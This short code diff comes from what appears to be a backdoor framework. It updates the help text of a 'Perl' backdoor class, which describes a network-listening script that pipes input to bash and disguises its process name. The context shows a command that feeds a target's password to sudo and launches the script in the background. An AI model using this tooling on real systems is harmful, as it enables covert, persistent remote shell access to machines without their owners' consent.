@@ -12,7 +12,7 @@ class Perl(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
-        self.help_text = "" 
+        self.help_text = INFO + "A script written in perl which listens on the network and redirects its input to bash, and renames its process to look less conspicuous." 
  
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl ~/prsA.pl"
